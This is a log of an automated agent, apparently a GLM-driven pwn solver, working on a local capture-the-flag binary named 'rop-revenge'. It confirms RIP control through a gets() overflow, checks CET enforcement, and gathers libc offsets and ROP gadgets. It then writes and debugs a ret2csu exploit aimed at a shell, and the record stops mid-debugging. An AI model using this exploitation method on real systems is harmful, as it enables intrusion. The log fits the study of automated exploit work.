14:12:39 [impact:BUG-001]   ← gdb_run(0.1s): [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎  ⏎ Program received signa...(413 chars)
14:12:39 [impact:BUG-001] → 调用 GLM...
14:12:45 [impact:BUG-001] ← GLM(6.5s): 调工具[make_payload]
14:12:45 [impact:BUG-001] 已确认：当返回地址为 0x4242424242424242 时，si_code=128 (SEGV_CPERR) 且 RIP 停留在 0x401238 (ret 指令)。CET 确实阻止了跳转到无效地址。  但在 pivot_test2 中，返回地址为 0x401237（一个有效的代码地址），且 `
14:12:45 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/rip_valid.bin", "parts": [["A", 112], ["\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x)
14:12:45 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0025-2023-52-rop-revenge-20260909-140653/rip_valid.bin len=128 preview_hex=41414141414141414141414141414141414141414141414141414141414...(155 chars)
14:12:45 [impact:BUG-001] → 调用 GLM...
14:12:48 [impact:BUG-001] ← GLM(3.2s): 调工具[gdb_run]
14:12:48 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "run < /work/workspace/0025-2023-52-rop-revenge-20260909-140)
14:12:48 [impact:BUG-001]   ← gdb_run(0.1s): [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎  ⏎ Program received signa...(385 chars)
14:12:48 [impact:BUG-001] → 调用 GLM...
14:13:02 [impact:BUG-001] ← GLM(14.1s): 调工具[execute]
14:13:02 [impact:BUG-001] 非常重要的发现！当返回地址为 0x401239（`main`，以 `endbr64` 开头）时，`ret` 指令成功跳转到了 0x401239！RIP 变成了 0x401239，然后程序从那里继续执行，最终在 0x7fffffffeb00 处崩溃（si_code=2，访问错误 - 可能是因为 RBP
14:13:02 [impact:BUG-001]   → 工具 execute({"command": "python3 -c \"\n# 0x4242424242424242 is not a mapped address - it's in userspace but not mapped\n# si_code 128 = SEGV_CPERR on some kernel)
14:13:02 [impact:BUG-001]   ← execute(0.0s): si_code 128 = SEGV_CPERR = Control Protection Error ⏎ This is specifically a CET violation, not a normal segfault ⏎  ⏎ But wait - 0x401239 (main, has ...(546 chars)
14:13:02 [impact:BUG-001] → 调用 GLM...
14:13:06 [impact:BUG-001] ← GLM(3.4s): 调工具[make_payload]
14:13:06 [impact:BUG-001] 这非常有趣。让我测试一下跳转到另一个有效但非 `endbr64` 的地址，以确定 CET 是否真的在执行：
14:13:06 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/rip_test2.bin", "parts": [["A", 112], ["\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x)
14:13:06 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0025-2023-52-rop-revenge-20260909-140653/rip_test2.bin len=128 preview_hex=41414141414141414141414141414141414141414141414141414141414...(155 chars)
14:13:06 [impact:BUG-001] → 调用 GLM...
14:13:08 [impact:BUG-001] ← GLM(2.2s): 调工具[gdb_run]
14:13:08 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "run < /work/workspace/0025-2023-52-rop-revenge-20260909-140)
14:13:08 [impact:BUG-001]   ← gdb_run(0.1s): [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ [Inferior 1 (process 6903...(296 chars)
14:13:08 [impact:BUG-001] → 调用 GLM...
14:13:13 [impact:BUG-001] ← GLM(5.0s): 调工具[make_payload]
14:13:13 [impact:BUG-001] 程序正常退出了！返回地址 0x4012c3 是 `pop rdi; ret`。程序跳转到那里，执行了 `pop rdi; ret`，然后返回到栈上的下一个值，最终正常退出。这明确证明了 **CET SHSTK 在运行时并未被强制执行** —— `ret` 指令可以跳转到攻击者控制的地址，包括非 `e
14:13:13 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/rip_dead.bin", "parts": [["A", 112], ["\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x4)
14:13:13 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0025-2023-52-rop-revenge-20260909-140653/rip_dead.bin len=128 preview_hex=414141414141414141414141414141414141414141414141414141414141...(154 chars)
14:13:13 [impact:BUG-001] → 调用 GLM...
14:13:16 [impact:BUG-001] ← GLM(2.5s): 调工具[gdb_run]
14:13:16 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "run < /work/workspace/0025-2023-52-rop-revenge-20260909-140)
14:13:16 [impact:BUG-001]   ← gdb_run(0.1s): [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎  ⏎ Program received signa...(374 chars)
14:13:16 [impact:BUG-001] → 调用 GLM...
14:13:25 [impact:BUG-001] ← GLM(9.4s): 调工具[make_payload]
14:13:25 [impact:BUG-001] 当返回地址为 0x0 时，RIP 变为 0x0 且 si_code=1 (SEGV_MAPERR)。因此 `ret` 确实跳转到了 0x0。这证实了 **CET SHSTK 并未被强制执行** —— `ret` 指令无条件地跳转到被覆盖的返回地址。  早先的 si_code=128 (0x42424
14:13:25 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/rip_control.bin", "parts": [["A", 112], ["\\x41\\x41\\x41\\x41\\x41\\x41\\x41\)
14:13:25 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0025-2023-52-rop-revenge-20260909-140653/rip_control.bin len=136 preview_hex=414141414141414141414141414141414141414141414141414141414...(157 chars)
14:13:25 [impact:BUG-001] → 调用 GLM...
14:13:29 [impact:BUG-001] ← GLM(3.5s): 调工具[gdb_run]
14:13:29 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "run < /work/workspace/0025-2023-52-rop-revenge-20260909-140)
14:13:29 [impact:BUG-001]   ← gdb_run(0.1s): [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎  ⏎ Program received signa...(413 chars)
14:13:29 [impact:BUG-001] → 调用 GLM...
14:13:34 [impact:BUG-001] ← GLM(5.2s): 调工具[make_payload]
14:13:34 [impact:BUG-001] 嗯，这次 RIP 停在了 0x401238，si_code=128。但之前使用 0x4012c3 时，它跳转成功了。区别在于 0x4242424242424242 是一个未映射的用户空间地址。让我检查一下内核是否对未映射地址有特殊的 CET 处理。让我尝试使用一个已映射但不可执行的（non-exec
14:13:34 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/rip_data.bin", "parts": [["A", 112], ["\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x4)
14:13:34 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0025-2023-52-rop-revenge-20260909-140653/rip_data.bin len=128 preview_hex=414141414141414141414141414141414141414141414141414141414141...(154 chars)
14:13:34 [impact:BUG-001] → 调用 GLM...
14:13:37 [impact:BUG-001] ← GLM(2.7s): 调工具[gdb_run]
14:13:37 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "run < /work/workspace/0025-2023-52-rop-revenge-20260909-140)
14:13:37 [impact:BUG-001]   ← gdb_run(0.1s): [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎  ⏎ Program received signa...(387 chars)
14:13:37 [impact:BUG-001] → 调用 GLM...
14:14:20 [impact:BUG-001] ← GLM(43.3s): 调工具[write_file]
14:14:20 [impact:BUG-001] 太棒了！当返回地址为 0x404038（.data 段，已映射但不可执行）时，RIP 变为 0x404038，且 si_code=2 (SEGV_ACCERR - 权限错误，因为 NX 阻止了执行)。`ret` 指令确实跳转到了攻击者指定的地址！  这明确证明了 **RIP_CONTROL 是可实现
14:14:20 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPoC for BUG-001: STACK_BUFFER_OVERFLOW via gets() with no bounds check and no stack canary.\n\nThis scrip)
14:14:20 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/poc-BUG-001.py
14:14:20 [impact:BUG-001] → 调用 GLM...
14:14:23 [impact:BUG-001] ← GLM(2.6s): 调工具[run_script]
14:14:23 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/poc-BUG-001.py", "timeout": 60})
14:14:23 [impact:BUG-001]   ← run_script(0.3s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ============================================================ ⏎ PRIM-001: RELATIVE_WRITE ⏎ =======================...(2816 chars)
14:14:23 [impact:BUG-001] → 调用 GLM...
14:15:45 [impact:BUG-001] ← GLM(81.9s): 调工具[submit_final_result]
14:15:45 [impact:BUG-001] 三个原语均已通过动态证据验证。我来整理一下关键发现：  1. **PRIM-001 (RELATIVE_WRITE)**：已验证 - 溢出操作将攻击者数据写入缓冲区边界之外（偏移 0x70 处的 saved RBP = 0xdeadbeefdeadbeef，偏移 0x78 处的 ret addr =
14:15:45 [impact:BUG-001] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，21040 chars）
14:15:45 [impact:BUG-001] → 调用 GLM...
14:15:51 [impact:BUG-001] ← GLM(6.6s)
14:15:51 [impact:BUG-001] S3 Primitive 分析与验证已完成。以下是三个已验证原语的总结：  **PRIM-001 (RELATIVE_WRITE) - 已验证**：`gets()` 溢出将攻击者控制的数据写入缓冲区边界之外。GDB 确认偏移量 0x70 处的已保存 RBP = 0xdeadbeefdeadbeef，
14:15:51 [stage3] 保存 → /work/workspace/0025-2023-52-rop-revenge-20260909-140653/stage3.json
14:15:51 --- S4 Exploit ---
14:15:51 === exploit (bug_id=-) ===
14:15:52 [exploit] → 调用 GLM...
14:15:57 [exploit] ← GLM(5.4s): 调工具[read_file, disassemble]
14:15:57 [exploit] 我将首先分析关键约束条件，然后加载相关的技能。  **关键观察点：** - No PIE, No Canary, Partial RELRO, NX enabled, CET SHSTK 未强制执行 - `gets()` 溢出 → 在偏移量 0x78 处实现 RIP_CONTROL - **关键约束
14:15:57 [exploit]   → 工具 read_file({"file_path": "/work/leanagent/skills/rop-ret2libc/SKILL.md", "limit": 1000})
14:15:57 [exploit]   → 工具 disassemble({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "lines": 200})
14:15:57 [exploit]   ← read_file(0.0s):  1  --- ⏎  2  name: rop-ret2libc ⏎  3  description: 栈溢出→RIP Control→ROP链/ret2libc/SROP拿shell。通用方法论。 ⏎  4  --- ⏎  5   ⏎  6  # ROP / ret2libc / SROP ⏎  ...(1300 chars)
14:15:57 [exploit]   ← disassemble(0.0s):  ⏎ /work/workspace/0025-2023-52-rop-revenge-20260909-140653/target:     file format elf64-x86-64 ⏎  ⏎  ⏎ Disassembly of section .init: ⏎  ⏎ 0000000000...(6018 chars)
14:15:57 [exploit] → 调用 GLM...
14:15:59 [exploit] ← GLM(2.4s): 调工具[disassemble, search_rop_gadgets]
14:15:59 [exploit] 现在让我看看 `__libc_csu_init` 的其余部分以获取 CSU gadgets，并搜索 ROP gadgets：
14:15:59 [exploit]   → 工具 disassemble({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "function": "__libc_csu_init", "lines": 100})
14:15:59 [exploit]   → 工具 search_rop_gadgets({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "max_results": 80})
14:15:59 [exploit]   ← disassemble(0.0s): 0000000000401260 <__libc_csu_init>: ⏎   401260:	endbr64 ⏎   401264:	push   r15 ⏎   401266:	lea    r15,[rip+0x2ba3]        # 403e10 <__frame_dummy_init...(1147 chars)
14:16:00 [exploit]   ← search_rop_gadgets(0.1s): Gadgets information ⏎ ============================================================ ⏎ 0x00000000004010dd : add ah, dh ; nop ; endbr64 ; ret ⏎ 0x0000000...(3904 chars)
14:16:00 [exploit] → 调用 GLM...
14:18:53 [exploit] ← GLM(173.4s)
14:18:53 [exploit] 现在我已经有了清晰的思路。让我来分析一下关键挑战和策略：  **关键约束**：在 `gets()` 之后，`close(1)` 和 `close(2)` 会在 `vuln` 返回之前被调用。因此，当我的 ROP 链开始时，stdout (fd 1) 和 stderr (fd 2) 已经关闭。这意味着
14:18:53 [retry] 无 submit（1/5），原地重试...
14:18:53 [exploit] → 调用 GLM...
14:18:59 [exploit] ← GLM(6.4s): 调工具[libc_offsets, got_plt]
14:18:59 [exploit] 让我通过检查 libc 偏移量和 GOT 布局来验证我的方法，然后编写漏洞利用程序。
14:18:59 [exploit]   → 工具 libc_offsets({"libc_path": "/lib/x86_64-linux-gnu/libc.so.6", "symbols": "gets,system,write,close,alarm,open,read,execve,dup2,dup3,puts,printf"})
14:18:59 [exploit]   → 工具 got_plt({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target"})
14:19:00 [exploit]   ← got_plt(0.3s): [{"offset": "0000000000403ff0", "type": "R_X86_64_GLOB_DAT", "value": "__libc_start_main@GLIBC_2.2.5"}, {"offset": "0000000000403ff8", "type": "R_X86_...(823 chars)
14:19:00 [exploit]   ← libc_offsets(0.3s): {"gets": "0x87160", "system": "0x58750", "write": "0x11c690", "close": "0x116810", "alarm": "0xee330", "open": "0x11b250", "read": "0x11bb80", "execve...(243 chars)
14:19:00 [exploit] → 调用 GLM...
14:19:02 [exploit] ← GLM(2.6s): 调工具[list_strings]
14:19:02 [exploit] 现在我已经确认了所有的偏移量。让我验证一下 libc 中 `/bin/sh` 字符串的偏移量，并检查 `gets` 的 GOT 解析行为：
14:19:02 [exploit]   → 工具 list_strings({"binary": "/lib/x86_64-linux-gnu/libc.so.6", "filter": "/bin/sh", "max_lines": 5})
14:19:02 [exploit]   ← list_strings(0.0s): /bin/sh ⏎ 
14:19:02 [exploit] → 调用 GLM...
14:19:07 [exploit] ← GLM(4.4s): 调工具[execute]
14:19:07 [exploit]   → 工具 execute({"command": "strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'"})
14:19:07 [exploit]   ← execute(0.0s):  1cb42f /bin/sh ⏎  ⏎ [Command succeeded with exit code 0]
14:19:07 [exploit] → 调用 GLM...
14:20:54 [exploit] ← GLM(107.5s): 调工具[execute]
14:20:54 [exploit] 很好。`/bin/sh` 在 libc 偏移量 `0x1cb42f` 处。现在让我确认一下我对 `gets` 行为的理解——它会读取直到遇到换行符，并且不会在缓冲区中存储 NUL 终止符。让我验证一下 GOT 条目布局和我的计划：  **已确认的 libc 偏移量：** - `gets`: 0x87
14:20:54 [exploit]   → 工具 execute({"command": "cat /proc/cpuinfo | grep flags | head -1 | tr ' ' '\\n' | grep -E 'shstk|ibt|cet'"})
14:20:54 [exploit]   ← execute(0.0s): ibt ⏎  ⏎ [Command succeeded with exit code 0]
14:20:54 [exploit] → 调用 GLM...
14:20:57 [exploit] ← GLM(3.0s): 调工具[execute]
14:20:57 [exploit] CPU 支持 IBT 但不支持 SHSTK。让我检查一下内核是否启用了 CET：
14:20:57 [exploit]   → 工具 execute({"command": "uname -r; cat /proc/sys/kernel/cet 2>/dev/null; dmesg 2>/dev/null | grep -i cet | head -5; sysctl -a 2>/dev/null | grep -i cet | head -5")
14:20:57 [exploit]   ← execute(0.0s): 6.18.33.2-microsoft-standard-WSL2 ⏎  ⏎ [Command succeeded with exit code 0]
14:20:57 [exploit] → 调用 GLM...
14:21:02 [exploit] ← GLM(4.8s): 调工具[execute]
14:21:02 [exploit] 没有 CET sysctl。让我测试一下 `ret2csu` 的间接调用是否真的有效，方法是检查 `write` 是否以 `endbr64` 开头：
14:21:02 [exploit]   → 工具 execute({"command": "objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -A2 '<write>:' | head -5"})
14:21:02 [exploit]   ← execute(0.2s): <no output> ⏎ [Command succeeded with exit code 0]
14:21:02 [exploit] → 调用 GLM...
14:21:06 [exploit] ← GLM(3.9s): 调工具[execute]
14:21:06 [exploit]   → 工具 execute({"command": "objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep '<__write>:' -A3 | head -5; objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep 'write' |)
14:21:06 [exploit]   ← execute(0.3s):    2a0ae:	e9 6d f9 0f 00       	jmp    129a20 <writev@@GLIBC_2.2.5+0xa0> ⏎    2a365:	e9 26 23 0f 00       	jmp    11c690 <__write@@GLIBC_2.2.5> ⏎    2...(1539 chars)
14:21:06 [exploit] → 调用 GLM...
14:21:10 [exploit] ← GLM(3.1s): 调工具[execute]
14:21:10 [exploit]   → 工具 execute({"command": "objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -A3 '11c690'"})
14:21:10 [exploit]   ← execute(0.2s):    2a365:	e9 26 23 0f 00       	jmp    11c690 <__write@@GLIBC_2.2.5> ⏎    2a36a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1) ⏎  ⏎ 000000000002a370 <...(4979 chars)
14:21:10 [exploit] → 调用 GLM...
14:21:14 [exploit] ← GLM(4.5s): 调工具[execute]
14:21:14 [exploit] `write` (`__write@@GLIBC_2.2.5`) 以 `endbr64` (0xf3 0f 0x1e 0xfa) 开头。因此，即使强制执行了 IBT，通过 `ret2csu` 的间接调用也能正常工作。让我再检查一下 `dup2` 和 `system`：
14:21:14 [exploit]   → 工具 execute({"command": "objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -A2 '<__dup2@@GLIBC_2.2.5>:' | head -5; echo \"---\"; objdump -d /lib/x86_64-linux-gnu/)
14:21:15 [exploit]   ← execute(0.4s): 0000000000116a90 <__dup2@@GLIBC_2.2.5>: ⏎   116a90:	f3 0f 1e fa          	endbr64 ⏎   116a94:	b8 21 00 00 00       	mov    $0x21,%eax ⏎ --- ⏎  ⏎ [Comm...(181 chars)
14:21:15 [exploit] → 调用 GLM...
14:21:19 [exploit] ← GLM(4.5s): 调工具[execute]
14:21:19 [exploit]   → 工具 execute({"command": "objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -A2 '<system@@GLIBC_2.2.5>:' | head -5; objdump -d /lib/x86_64-linux-gnu/libc.so.6 | gr)
14:21:20 [exploit]   ← execute(0.5s): 0000000000058750 <__libc_system@@GLIBC_PRIVATE>: ⏎    58750:	f3 0f 1e fa          	endbr64 ⏎    58754:	48 85 ff             	test   %rdi,%rdi ⏎    587...(266 chars)
14:21:20 [exploit] → 调用 GLM...
14:21:28 [exploit] ← GLM(8.3s): 调工具[execute]
14:21:28 [exploit] `dup2` 和 `system` 都以 `endbr64` 开头。因此，即使强制执行了 IBT，`ret2csu` 的间接调用也能正常工作。  现在，让我思考一下是否真的强制执行了 IBT。S3 验证了 `ret` 可以跳转到非 `endbr64` 的目标。但 IBT 适用于间接 `call`/`
14:21:28 [exploit]   → 工具 execute({"command": "grep -i cet /proc/cpuinfo | head -1; echo \"---\"; cat /proc/cpuinfo | head -30 | grep flags | tr ' ' '\\n' | grep -iE 'shstk|ibt|cet'"})
14:21:28 [exploit]   ← execute(0.0s): --- ⏎ ibt ⏎  ⏎ [Command succeeded with exit code 0]
14:21:28 [exploit] → 调用 GLM...
14:22:20 [exploit] ← GLM(52.0s): 调工具[write_file]
14:22:20 [exploit] CPU 支持 IBT 但不支持 SHSTK。然而，Linux 内核对用户空间 IBT 的支持需要内核配置 `CONFIG_X86_CET`。WSL2 内核 (6.18) 可能支持也可能不支持它。S3 验证了 `ret` 可以正常工作（SHSTK 未强制执行）。对于 IBT，`ret2csu` 使用了
14:22:20 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nS4 Exploit for rop-revenge (BUG-001: gets() stack overflow)\n\nBinary: No PIE, No Canary, Partial RELRO, )
14:22:20 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/exploit.py
14:22:20 [exploit] → 调用 GLM...
14:22:23 [exploit] ← GLM(2.8s): 调工具[run_script]
14:22:23 [exploit] 让我先测试一下 exploit：
14:22:23 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/exploit.py", "timeout": 60})
14:22:24 [exploit]   ← run_script(0.7s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === EXPLOIT FAILED after all attempts ===
14:22:24 [exploit] → 调用 GLM...
14:22:34 [exploit] ← GLM(10.7s): 调工具[write_file]
14:22:34 [exploit] 利用失败了。让我调试一下。问题可能出在几个地方。让我先测试一下基本的 ROP 链是否有效，以及 `gets` 是否正确读取了部分覆盖数据。让我用一个更简单的测试来调试：
14:22:34 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"Debug: test basic ROP chain and gets calls\"\"\"\nfrom pwn import *\nimport sys\n\ncontext.arch = 'amd64'\n)
14:22:34 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/debug1.py
14:22:34 [exploit] → 调用 GLM...
14:22:37 [exploit] ← GLM(2.3s): 调工具[run_script]
14:22:37 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/debug1.py", "timeout": 15})
14:22:37 [exploit]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ [+] Starting local process '/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target' argv=[b'/work/worksp...(1055 chars)
14:22:37 [exploit] → 调用 GLM...
14:22:54 [exploit] ← GLM(17.2s): 调工具[write_file]
14:22:54 [exploit] 栈迁移（stack pivot）工作正常（程序没有崩溃，`main` 再次运行）。现在让我测试一下部分覆盖（partial overwrite）和 `dup2` 调用。让我使用 `gdb` 来了解发生了什么：
14:22:54 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"Debug: test partial overwrite of close@GOT → dup2, then dup2(0,1)\"\"\"\nfrom pwn import *\n\ncontext.arch )
14:22:54 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/debug2.py
14:22:54 [exploit] → 调用 GLM...
14:23:00 [exploit] ← GLM(5.4s): 调工具[run_script]
14:23:00 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/debug2.py", "timeout": 15})
14:23:00 [exploit]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ [+] Starting local process '/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target' argv=[b'/work/worksp...(705 chars)
14:23:00 [exploit] → 调用 GLM...
14:23:27 [exploit] ← GLM(26.8s): 调工具[write_file]
14:23:27 [exploit] 计算结果是正确的。现在让我测试一下实际的 exploit 流程——部分覆盖 + dup2 + write 泄露。让我写一个有针对性的调试脚本：
14:23:27 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"Debug: test full leak chain with known nibble\"\"\"\nfrom pwn import *\n\ncontext.arch = 'amd64'\ncontext.l)
14:23:27 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/debug3.py
14:23:27 [exploit] → 调用 GLM...
14:23:31 [exploit] ← GLM(4.1s): 调工具[run_script]
14:23:31 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/debug3.py", "timeout": 20})
14:23:31 [exploit]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ [+] Starting local process '/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target' argv=[b'/work/worksp...(2897 chars)
14:23:31 [exploit] → 调用 GLM...
14:23:45 [exploit] ← GLM(13.8s): 调工具[execute]
14:23:45 [exploit] 泄露失败——未接收到数据。问题在于 `write(1, gets@GOT, 8)` 没有产生输出。让我思考一下原因：  1. `dup2(0, 1)` 应该重新打开 fd 1。但在 `process()` 中，fd 0 是管道的读取端。`dup2(0, 1)` 会使 fd 1 成为 fd 0 的副本
14:23:45 [exploit]   → 工具 execute({"command": "python3 -c \"\nfrom pwn import *\ncontext.log_level='error'\np = process('/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target)
14:23:45 [exploit]   ← execute(0.0s): 【已被工具层拦截】禁止用 execute 跑内联 `python -c` 里的 pwntools 交互（recv 无 timeout → stdin 死锁 → 烧墙钟）。改用：① run_binary(stdin=, timeout=10)；② write_file 完整脚本（内部 recv 必带 ...(189 chars)
14:23:45 [exploit] → 调用 GLM...
14:23:49 [exploit] ← GLM(4.4s): 调工具[write_file]
14:23:49 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nfrom pwn import *\nimport os\ncontext.log_level='error'\np = process('/work/workspace/0025-2023-52-rop-revenge-20)
14:23:49 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_fd.py
14:23:49 [exploit] → 调用 GLM...
14:23:54 [exploit] ← GLM(5.0s): 调工具[run_script]
14:23:54 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_fd.py", "timeout": 10})
14:23:54 [exploit]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ fd 0: pipe:[507327] ⏎ fd 1: /dev/pts/1 ⏎ fd 2: /dev/pts/1
14:23:54 [exploit] → 调用 GLM...
14:24:23 [exploit] ← GLM(28.9s): 调工具[write_file]
14:24:23 [exploit] 有趣！fd 0 是一个管道，但 fd 1 和 fd 2 是 `/dev/pts/1`（一个终端）。所以当程序调用 `close(1)` 和 `close(2)` 时，它会关闭终端 fd。fd 0 仍然是管道。  所以 `dup2(0, 1)` 会使 fd 1 指向管道（fd 0 的读取端）。写入管道
14:24:23 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nfrom pwn import *\nimport os\ncontext.log_level='error'\n# Use PTY for stdin\np = process('/work/workspace/0025-2)
14:24:23 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_fd2.py
14:24:23 [exploit] → 调用 GLM...
14:24:34 [exploit] ← GLM(11.0s): 调工具[run_script]
14:24:34 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_fd2.py", "timeout": 10})
14:24:34 [exploit]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ fd 0: /dev/pts/1 ⏎ fd 1: /dev/pts/1 ⏎ fd 2: /dev/pts/1
14:24:34 [exploit] → 调用 GLM...
14:24:57 [exploit] ← GLM(23.0s): 调工具[write_file]
14:24:57 [exploit] 使用 `stdin=PTY` 时，所有三个 fd 都指向同一个 PTY (`/dev/pts/1`)。PTY 是双向的——写入 fd 0 会将输出发送回 PTY，攻击者可以读取它。因此，在使用 `stdin=PTY` 时，`dup2(0, 1)` 会将 fd 1 重新打开为 PTY，而 `write
14:24:57 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"Debug: test full leak chain with PTY stdin\"\"\"\nfrom pwn import *\n\ncontext.arch = 'amd64'\ncontext.log_)
14:24:57 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/debug4.py
14:24:57 [exploit] → 调用 GLM...
14:25:00 [exploit] ← GLM(3.0s): 调工具[run_script]
14:25:01 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/debug4.py", "timeout": 20})
14:25:01 [exploit]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ [+] Starting local process '/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target' argv=[b'/work/worksp...(2267 chars)
14:25:01 [exploit] → 调用 GLM...
14:25:23 [exploit] ← GLM(21.9s): 调工具[write_file]
14:25:23 [exploit] 仍然没有收到泄露。让我用 GDB 调试一下，看看发生了什么。问题可能在于： 1. `gets` 读取了部分覆盖字节，但也可能读取了额外的字节（换行符处理） 2. `dup2` 调用可能失败了 3. `write` 调用可能失败了  让我使用 GDB 来检查一下：
14:25:23 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"GDB debug: check what happens at each stage\"\"\"\nfrom pwn import *\n\ncontext.arch = 'amd64'\ncontext.log)
14:25:23 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/debug5.py
14:25:23 [exploit] → 调用 GLM...
14:29:16 [exploit] ← GLM(233.8s)
14:29:16 [exploit] 实际上，GDB attach 在自动化环境中效果不佳。让我换一种方法——使用 `gdb_run` 来检查关键点：00
14:29:16 [retry] 无 submit（2/5），原地重试...
14:29:16 [exploit] → 调用 GLM...
14:29:26 [exploit] ← GLM(10.0s): 调工具[gdb_run]
14:29:26 [exploit] 让我使用 `gdb_run` 来检查在部分覆盖之后，`close@GOT` 和 `gets@GOT` 中发生了什么：
14:29:26 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "b *0x401238; run; x/gx 0x404020; x/gx 0x404028; continue", )
14:29:26 [exploit]   ← gdb_run(0.1s): Breakpoint 1 at 0x401238 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(387 chars)
14:29:27 [exploit] → 调用 GLM...
